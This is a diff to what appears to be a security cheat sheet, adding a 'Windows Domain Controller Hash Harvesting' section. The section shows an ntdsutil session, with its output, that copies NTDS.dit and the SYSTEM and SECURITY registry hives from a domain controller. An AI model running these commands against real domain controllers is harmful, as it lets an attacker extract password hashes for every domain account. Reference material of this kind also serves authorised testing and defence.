@@ -111,3 +111,21 @@ tcpdump -r <file> 'src host 8.8.8.8'
 tcpdump -r <file> 'not src host 8.8.8.8'
 tcpdump -r <file> 'icmp and (src host 8.8.8.8'
 ```
+
+## Windows Domain Controller Hash Harvesting
+
+GOAL: Obtain ```NTDS.dit``` and SYSTEM registry hive data
+
+```
+C:\Users\RoseSecurity> ntdsutil
+ntdsutil: activate instance ntds
+ntdsutil: ifm
+ifm: create full c:\ntds
+
+Copying registry files...
+Copying c:\ntds\registry\SYSTEM
+Copying c:\ntds\registry\SECURITY
+IFM media created successfully in c:\ntds
+ifm: quit
+ntdsutil: quit
+```
